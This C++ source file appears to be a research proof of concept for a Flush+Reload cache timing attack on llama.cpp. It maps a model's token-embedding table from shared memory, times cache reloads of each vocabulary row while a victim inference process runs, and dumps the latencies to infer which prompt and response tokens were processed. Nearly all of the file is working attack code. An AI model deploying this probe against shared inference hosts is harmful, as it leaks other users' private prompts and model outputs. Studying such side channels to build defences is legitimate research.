#include <string>
#include <iostream>
#include <fstream>
#include <assert.h>
#include <filesystem>
#include <vector>
#include <string>
#include <functional>
#include <atomic>
#include <set>
#include <random>
#include <chrono>
#include "config-database.hh"
#include "util.h"
#include "tokenizer.hh"
#include "attack.hh"
#include "progressbar.hh"
#include <thread>

#include <signal.h>

#include <nlohmann/json.hpp>
using json = nlohmann::json;

std::atomic<bool> stopped;
std::string hw, llm, prog_pathname, gguf_file, dataset_pathname, outfile;
size_t max_out_tokens;


static void copy_file(const std::string &from, const std::string &to_dir) {
    auto to = to_dir + "/" + from;
    if (!std::filesystem::copy_file(from, to)) {
        std::cerr << "failed on copying '" << from << "' to '" << to << "'" << std::endl;
        exit(-1);
    }
}

bool is_instruct(const std::string &llm) {
    if (!llm.compare("llama-2-7b-chat"))
        return true;
    assert(0);
    return false;
}

static void signal_stop_handler(int signum) {
    if (signum == SIGINT) {
        stopped.store(true);
        std::cout << "Request to stop..." << std::endl;
    }
}


class Prober {
    std::string prompt;
    uint32_t n_vocab, n_embd;
    llama_vocab vocab;
    uint8_t *embed_ptr;
    unsigned embed_nb[EMBED_N_DIMS];
    llm_arch arch;
    llama_mlock mem_lock;
    uint16_t *latency;
    size_t latency_pos, latency_len;
    std::atomic<bool> f_stop;
    std::unique_ptr<std::thread> jit_thread;
    std::vector<bool> should_rec;

public:

    int init(const char *weight_file, json &ds) {
        int ret;

        latency_len = 265 * 10000000ul;
        latency = new uint16_t[latency_len];
        latency_pos = 0;

        unsigned long tgt_img_size;
        uint8_t *tgt_image = (uint8_t *)get_shared_memory(weight_file, &tgt_img_size);
        if (!tgt_image) {
            return 1;
        }
        
        struct gguf_init_params params = {
            /*.no_alloc = */ true,
        };

        struct gguf_context *ctx_gguf = gguf_init_from_file(weight_file, params);
        if (!ctx_gguf) {
            printf("%s: failed to load model from %s\n", __func__, weight_file);
            return 1;
        }

        auto dump_tensor_names = [&]() {
            for(unsigned i=0;i<ctx_gguf->header.n_tensors;++i) {
                printf("%s\n", ctx_gguf->infos[i].name.data);
            }
        };

        const int idx = gguf_find_tensor(ctx_gguf, cfg().token_embd_name.c_str());

        if (idx < 0) {
            printf("%s: tensor '%s' not found in the file", __func__, cfg().token_embd_name.c_str());
            dump_tensor_names();
            return 1;
        }

        size_t embd_off = gguf_get_data_offset(ctx_gguf) + gguf_get_tensor_offset(ctx_gguf, idx);
        embed_ptr = tgt_image + embd_off;
        printf("Embed file offset = %lu\n", embd_off);
        
        if (ctx_gguf->infos[idx].n_dims != EMBED_N_DIMS) {
            printf("invalid embed dims\n");
            return 1;
        }

        auto type = ctx_gguf->infos[idx].type;
        unsigned elem_size = ggml_type_size(type);
        embed_nb[0] = elem_size;
        embed_nb[1] = embed_nb[0]*(ctx_gguf->infos[idx].ne[0]/ggml_blck_size(type));
        for (int i = 2; i < EMBED_N_DIMS; i++) {
            embed_nb[i] = embed_nb[i - 1]*ctx_gguf->infos[idx].ne[i - 1];
        }

        llm_load_arch(ctx_gguf, arch);
        llm_load_hparams(ctx_gguf, arch, n_vocab, n_embd);
        printf("n_vocab = %u\n", n_vocab);
        printf("n_embd = %u\n", n_embd);
        for(unsigned i=0;i<2;++i)
            printf("embed_nb[%u] = %d\n", i, embed_nb[i]);

        // transposed
        if ( (ctx_gguf->infos[idx].ne[0] != n_embd) ||
                (ctx_gguf->infos[idx].ne[1] != n_vocab) ) {
            printf("invalid embed weight shape\n");
            return 1;
        }

#if 0
        // lock virtual memory
        mem_lock.init(embed_ptr);
        size_t embed_nbytes;
        size_t blck_size = ggml_blck_size(type);
        if (blck_size == 1) {
            embed_nbytes = ggml_type_size(type);
            for (int i = 0; i < GGML_MAX_DIMS; ++i) {
                embed_nbytes += (ctx_gguf->infos[idx].ne[i] - 1)*embed_nb[i];
            }
        }
        else {
            embed_nbytes = ctx_gguf->infos[idx].ne[0]*embed_nb[0]/blck_size;
            for (int i = 1; i < GGML_MAX_DIMS; ++i) {
                embed_nbytes += (ctx_gguf->infos[idx].ne[i] - 1)*embed_nb[i];
            }
        }
        std::cout << "mlock size = " << embed_nbytes << std::endl;
        if (!mem_lock.grow_to(embed_nbytes)) {
            std::cerr << "failed to lock the virtual memory" << std::endl;
            return 1;
        }
#endif

        ret = llm_load_vocab(ctx_gguf, vocab, arch);
        if (ret)
            return ret;

        size_t k = 0; //1822;
        auto &results = ds["results"];
        std::cout << "Evaluating dataset " << results[k]["d"] << std::endl;

        auto &resp_tokens = results[k]["g"]["o"];
        auto &prompt_tokens = results[k]["g"]["i"];

        prompt.clear();
        for (unsigned tk : prompt_tokens) {
            char buf[256];
            int ret = llama_token_to_piece(n_vocab, vocab, tk, buf, sizeof(buf));
            if (ret < 0) {
                fprintf(stderr, "llama_token_to_piece(): buf overflow, ret = %d\n", ret);
                return 1;
            } else
                buf[ret] = '\0';
            prompt += buf;
        }

        should_rec.resize(n_vocab);
        for (unsigned tk : prompt_tokens) {
            should_rec[tk]=true;
        }
        // run-collect-latency first, then copy the ['g']['o'] of the groundtruth.json to the follows:
        resp_tokens = {29871,20212,21504,471,263,1565,15680,755,29892,263,767,310,1784,5969,1237,322,1209,1080,29889,19298,297,12115,297,29871,29896,29955,29900,29953,29892,540,471,278,29871,29896,29945,386,310,29871,29896,29955,4344,304,263,23794,280,2136,261,322,670,6532,29889,19454,278,3165,569,1812,2559,886,29892,21504,11492,304,4953,697,310,278,1556,7112,2556,13994,297,3082,4955,29889,13,13,2887,263,4123,767,29892,21504,471,623,29878,4173,287,304,670,9642,8099,5011,29892,1058,15205,263,14010,5381,297,18292,29889,21504,9098,11827,3654,304,367,263,2071,24455,9227,29892,6920,29892,322,9805,261,29892,322,540,4720,3897,263,18096,297,278,5381,29889,940,1304,670,14010,3965,304,9805,278,16636,29604,29892,607,3897,697,310,278,1556,17644,1303,322,3390,287,14578,21321,297,278,8104,583,29889,13,13,7675,29895,1915,29915,29879,2551,297,27256,5331,304,916,28602,1907,29889,940,471,11467,304,278,16636,13266,297,29871,29896,29955,29941,29896,322,9098,3897,263,11822,297,278,784,2592,29889,940,471,263,4549,22545,403,363,9793,322,9213,304,10127,278,3014,310,16636,29889,940,884,5318,263,1820,6297,297,278,18195,292,322,26188,310,278,3826,23838,310,28052,663,297,29871,29896,29955,29955,29953,29892,322,540,471,697,310,278,937,1804,414,310,278,3303,3900,20063,297,29871,29896,29955,29947,29955,29889};
        // then, you must re-run the test
        for (unsigned tk : resp_tokens) {
            should_rec[tk]=true;
        }

        // check the permutation
        size_t n_probed = n_vocab; 
        std::unordered_set<size_t> permu_map;
        for (size_t v = 0; v < n_probed; ++v) {
            auto s = get_permutation(v, n_probed);
            permu_map.insert(s);
        }
        assert(permu_map.size() == n_probed);

        return 0;
    }
    void dump(const std::string &fn) {
        std::ofstream fout(fn);
        assert(fout);
        for (size_t i =0; i < latency_pos;++i) {
            fout << latency[i]<< std::endl;
        }

        std::ofstream fout2(fn + ".vocab.csv");
        assert(fout2);
        for (size_t v = 0; v < n_vocab; ++v) {
            auto s = get_permutation(v, n_vocab);
            if(should_rec[s]) {
                fout2 << s << std::endl;
            }  
        }
    }
    ~Prober() {
    }

    inline std::string get_prompt() const {
        return prompt;
    }

    static inline size_t get_permutation(size_t i, size_t n) {
        return (i * 167 + 13) % n;
    }

    static void probe_thread(void *p) {
        auto self = (Prober *)p;
        pin_processor(0);
        set_highest_unprivileged_priority();

        for (size_t k =0; k < self->n_vocab; ++k) {
            flush(self->embed_ptr + k*self->embed_nb[1] + self->embed_nb[1]/2);
        }

        while(!self->f_stop.load()) {
            for (size_t v = 0; v < self->n_vocab; ++v) {
                auto s = get_permutation(v, self->n_vocab);
                
                auto lat = flushed_reload(
                    self->embed_ptr + s*self->embed_nb[1] + self->embed_nb[1]/2);


                if(self->should_rec[s]) {
                    

                    assert(self->latency_pos < self->latency_len);
                    self->latency[self->latency_pos++] = std::min(65535ul,lat);
                }  
            }
        }
    }


    int loop(const std::function<int()> &query, bool echo) {
        int exited = 0;

        f_stop = false;
        latency_pos = 0;
        jit_thread = std::make_unique<std::thread>(probe_thread, this);

        for(;;) {
            if ((exited = query())) {
                f_stop.store(true);
                jit_thread->join();
                return exited;
            }
        }
        return 0;
    }

};

static int run_llamacpp(Prober *attack, const std::string &user_prompt) {    
    std::string promot_filename = get_temp_dir();
    promot_filename += "/.tmp.txt";
    std::ofstream fprompt(promot_filename);
    if (!fprompt)
        return -1;
    // apply chat template
    std::cout << "prompt: " << cfg().chat_template(user_prompt) << std::endl;
    fprompt << cfg().chat_template(user_prompt);
    fprompt.close();

    auto max_out_tokens_s = tostr(max_out_tokens);
    auto ngl_s = tostr(cfg().n_gpu_layers);
    const char *proc_argv[] = {
        prog_pathname.c_str(),
        "-m", gguf_file.c_str(),
        "-f", promot_filename.c_str(),
        //"-b", "1",
        "-s", "123",
        "--n-gpu-layers", ngl_s.c_str(),
        "--max-out-tokens", max_out_tokens_s.c_str(),
        "--ctx-size", "4096",
    };

    auto proc = create_process(proc_argv, sizeof(proc_argv)/sizeof(*proc_argv),false);
    if (!proc) {
        printf("create_process()\n");
        return -1;
    }
    int status;
    attack->loop([&]() -> int {
        if (wait_process(proc, status)) {
            free_process(proc);
            return -1;
        }
        return 0;
    }, /* echo */ false);
    if (status) {
        std::cerr << prog_pathname << " exited with code " << status << std::endl;
    }
    return status;
}

bool parse_inc_opt(const char *v) {
    if (!strcmp(v,"resume"))
        return true;
    else {
        if (strcmp(v,"new")) {
            std::cerr << "invalid value " << v << std::endl;
            exit(1);
        }
        return false;
    }
}

int main(int argc, char *argv[]) {
    if (argc != 8) {
        printf("Usage %s hw\n"
                "llm\n"
                "prog_pathname\n"
                "gguf_file\n"
                "dataset_pathname\n"
                "out\n"
                "max_out_tokens\n", argv[0]);
        return 1;
    }
    hw = argv[1],
    llm = argv[2],
    prog_pathname = argv[3],
    gguf_file = argv[4],
    dataset_pathname = argv[5],
    outfile = argv[6];
    max_out_tokens =  strtol(argv[7], nullptr, 10);

    load_config(hw, llm, false);

    assert(PAGE_SIZE == get_page_size());

    srand(1023);

    // load datasets
    json ds;
    std::ifstream fin_dataset(dataset_pathname);
    assert(fin_dataset);
    fin_dataset >> ds;

    auto attack = std::make_unique<Prober>();
    int ret = attack->init(gguf_file.c_str(), ds);
    if (ret)
        return ret;

    
    stopped.store(false);
    signal(SIGINT, &signal_stop_handler);

    int status;

    // warming up
    if ((status = run_llamacpp(attack.get(), "say nothing")))
        return -1;
    std::cout << "Running..." << std::endl;

    auto prompt = attack->get_prompt();
    std::cout << "prompt:" << prompt << std::endl;

    if ((status = run_llamacpp(attack.get(), prompt)))
        goto out;

    attack->dump(outfile);
    std::cout << "done\n";

out:
    return 0;
}
